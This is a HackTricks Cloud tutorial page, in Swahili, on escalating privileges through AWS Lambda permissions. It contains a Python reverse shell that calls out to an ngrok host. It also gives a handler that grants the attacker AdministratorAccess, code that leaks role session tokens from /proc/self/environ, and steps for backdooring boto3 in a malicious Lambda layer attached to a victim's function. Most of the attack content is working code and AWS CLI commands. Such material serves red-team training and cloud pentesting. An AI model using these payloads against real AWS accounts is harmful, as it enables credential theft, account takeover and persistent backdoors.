# AWS - Lambda Privesc

{% hint style="success" %}
Jifunze na kufanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na kufanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## lambda

Maelezo zaidi kuhusu lambda katika:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Watumiaji wenye ruhusa za **`iam:PassRole`, `lambda:CreateFunction`, na `lambda:InvokeFunction`** wanaweza kuongeza haki zao.\
Wanaweza **kuunda kazi mpya ya Lambda na kuipatia jukumu la IAM lililopo**, na hivyo kazi hiyo itapata ruhusa zinazohusiana na jukumu hilo. Mtumiaji anaweza kisha **kuandika na kupakia msimbo kwenye kazi hii ya Lambda (kwa mfano rev shell)**.\
Mara kazi inapowekwa, mtumiaji anaweza **kuanzisha utekelezaji wake** na vitendo vilivyokusudiwa kwa kuamsha kazi ya Lambda kupitia API ya AWS. Njia hii inamruhusu mtumiaji kutekeleza majukumu kwa njia isiyo ya moja kwa moja kupitia kazi ya Lambda, akifanya kazi na kiwango cha ufikiaji kilichopewa jukumu la IAM lililohusishwa nayo.\\

Mshambuliaji anaweza kutumia hii kupata **rev shell na kuiba token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Unaweza pia **kutumia vibaya ruhusa za lambda role** kutoka kwenye lambda function yenyewe.\
Ikiwa lambda role ina ruhusa za kutosha unaweza kuitumia kukupa haki za msimamizi:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Inawezekana pia kuvuja hati za jukumu la lambda bila kuhitaji muunganisho wa nje. Hii itakuwa muhimu kwa **Network isolated Lambdas** zinazotumika kwenye kazi za ndani. Ikiwa kuna vikundi vya usalama visivyojulikana vinavyofuatilia reverse shells zako, kipande hiki cha msimbo kitakuruhusu kuvuja hati moja kwa moja kama matokeo ya lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Athari Inayowezekana:** Privesc ya moja kwa moja kwa jukumu la huduma ya lambda lililobainishwa kiholela.

{% hint style="danger" %}
Kumbuka kwamba hata kama inaweza kuonekana ya kuvutia **`lambda:InvokeAsync`** **hairuhusu** yenyewe **kutekeleza `aws lambda invoke-async`**, unahitaji pia `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kama katika hali ya awali, unaweza **kujipa ruhusa ya `lambda:InvokeFunction`** ikiwa una ruhusa **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Privesc ya moja kwa moja kwa jukumu la huduma ya lambda lililobainishwa kiholela.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Watumiaji wenye ruhusa za **`iam:PassRole`, `lambda:CreateFunction`, na `lambda:CreateEventSourceMapping`** (na pengine `dynamodb:PutItem` na `dynamodb:CreateTable`) wanaweza **kuongeza marupurupu** kwa njia isiyo ya moja kwa moja hata bila `lambda:InvokeFunction`.\
Wanaweza kuunda **kazi ya Lambda yenye msimbo mbaya na kuipatia jukumu la IAM lililopo**.

Badala ya kuanzisha Lambda moja kwa moja, mtumiaji huanzisha au kutumia jedwali la DynamoDB lililopo, akilifunga na Lambda kupitia ramani ya chanzo cha tukio. Mpangilio huu unahakikisha kazi ya Lambda **inachochewa kiotomatiki wakati kipengee kipya kinapoingizwa** kwenye jedwali, ama kwa kitendo cha mtumiaji au mchakato mwingine, hivyo kuanzisha kazi ya Lambda kwa njia isiyo ya moja kwa moja na kutekeleza msimbo kwa ruhusa za jukumu la IAM lililopitishwa.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ikiwa DynamoDB tayari inatumika katika mazingira ya AWS, mtumiaji anahitaji tu **kuanzisha ramani ya chanzo cha tukio** kwa kazi ya Lambda. Hata hivyo, ikiwa DynamoDB haitumiki, mtumiaji lazima **aunde jedwali jipya** lenye utiririshaji umewezeshwa:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sasa inawezekana **kuunganisha kazi ya Lambda na jedwali la DynamoDB** kwa **kuunda ramani ya chanzo cha tukio**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Kwa kutumia Lambda function iliyounganishwa na DynamoDB stream, mshambuliaji anaweza **kuanzisha Lambda kwa njia isiyo ya moja kwa moja kwa kuamsha DynamoDB stream**. Hii inaweza kufanyika kwa **kuingiza kipengee** kwenye jedwali la DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** Privesc ya moja kwa moja kwa jukumu la huduma ya lambda lililobainishwa.

### `lambda:AddPermission`

Mshambuliaji mwenye ruhusa hii anaweza **kujitunuku (au wengine) ruhusa yoyote** (hii inazalisha sera za msingi wa rasilimali ili kutoa ufikiaji kwa rasilimali):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Athari Inayowezekana:** Privesc ya moja kwa moja kwa jukumu la huduma ya lambda inayotumika kwa kutoa ruhusa ya kurekebisha msimbo na kuutekeleza.

### `lambda:AddLayerVersionPermission`

Mshambulizi mwenye ruhusa hii anaweza **kujitolea mwenyewe (au wengine) ruhusa `lambda:GetLayerVersion`**. Anaweza kufikia safu na kutafuta udhaifu au taarifa nyeti.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Athari Zinawezekana:** Uwezekano wa kupata taarifa nyeti.

### `lambda:UpdateFunctionCode`

Watumiaji wenye ruhusa ya **`lambda:UpdateFunctionCode`** wana uwezo wa **kubadilisha msimbo wa Lambda function iliyopo ambayo imeunganishwa na IAM role.**\
Mshambuliaji anaweza **kubadilisha msimbo wa lambda ili kuvuja IAM credentials**.

Ingawa mshambuliaji anaweza asiwe na uwezo wa moja kwa moja wa kuanzisha function, kama Lambda function ipo tayari na inafanya kazi, kuna uwezekano mkubwa kwamba itachochewa kupitia workflows au matukio yaliyopo, hivyo kuwezesha utekelezaji wa msimbo uliobadilishwa kwa njia isiyo ya moja kwa moja.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potential Impact:** Privesc moja kwa moja kwa jukumu la huduma ya lambda linalotumika.

### `lambda:UpdateFunctionConfiguration`

#### Utangulizi

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) inaruhusu kujumuisha **msimbo** katika kazi yako ya lambda lakini **kuuhifadhi kando**, hivyo msimbo wa kazi unaweza kubaki mdogo na **kazi kadhaa zinaweza kushiriki msimbo**.

Ndani ya lambda unaweza kuangalia njia ambazo msimbo wa python unapakiwa kwa kutumia kazi kama ifuatayo:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Hizi ni sehemu:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Kwa mfano, maktaba boto3 inapakuliwa kutoka `/var/runtime/boto3` (nafasi ya 4).

#### Udukuzi

Inawezekana kutumia vibaya ruhusa ya `lambda:UpdateFunctionConfiguration` **kuongeza safu mpya** kwenye kazi ya lambda. Ili kutekeleza msimbo wowote, safu hii inahitaji kuwa na **maktaba ambayo lambda itapakua.** Ikiwa unaweza kusoma msimbo wa lambda, unaweza kupata hii kwa urahisi, pia kumbuka kuwa inawezekana lambda **tayari inatumia safu** na unaweza **kupakua** safu hiyo na **kuongeza msimbo wako** humo.

Kwa mfano, tuseme lambda inatumia maktaba boto3, hii itaunda safu ya ndani na toleo la mwisho la maktaba:
```
pip3 install -t ./lambda_layer boto3
```
Unaweza kufungua `./lambda_layer/boto3/__init__.py` na **kuongeza backdoor katika msimbo wa kimataifa** (kazi ya kuvuja sifa au kupata reverse shell kwa mfano).

Kisha, zip hiyo `./lambda_layer` saraka na **pakia safu mpya ya lambda** katika akaunti yako mwenyewe (au katika akaunti ya mwathirika, lakini huenda usiwe na ruhusa kwa hili).\
Kumbuka kuwa unahitaji kuunda folda ya python na kuweka maktaba humo ili kuandika upya /opt/python/boto3. Pia, safu inahitaji kuwa **inayolingana na toleo la python** linalotumiwa na lambda na ikiwa utaipakia kwenye akaunti yako, inahitaji kuwa katika **eneo moja:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Sasa, fanya safu ya lambda iliyopakiwa **ipatikane na akaunti yoyote**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Na ambatanisha lambda layer kwenye lambda function ya mwathirika:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Hatua inayofuata itakuwa ni **kuanzisha kazi** sisi wenyewe ikiwa tunaweza au kusubiri hadi **itakapoitwa** kwa njia za kawaida‚Äìambayo ni njia salama zaidi.

Njia **ya siri zaidi ya kutumia udhaifu huu** inaweza kupatikana katika:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Athari Zinawezekana:** Privesc ya moja kwa moja kwa jukumu la huduma ya lambda linalotumika.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Labda kwa ruhusa hizo unaweza kuunda kazi na kuitekeleza kwa kupiga URL... lakini sikuweza kupata njia ya kuijaribu, kwa hivyo nijulishe ikiwa utaweza!

### Lambda MitM

Baadhi ya lambdas zitakuwa **zinapokea taarifa nyeti kutoka kwa watumiaji katika vigezo.** Ikiwa utapata RCE katika moja yao, unaweza kuiba taarifa ambazo watumiaji wengine wanatuma kwake, angalia katika:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Marejeo

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
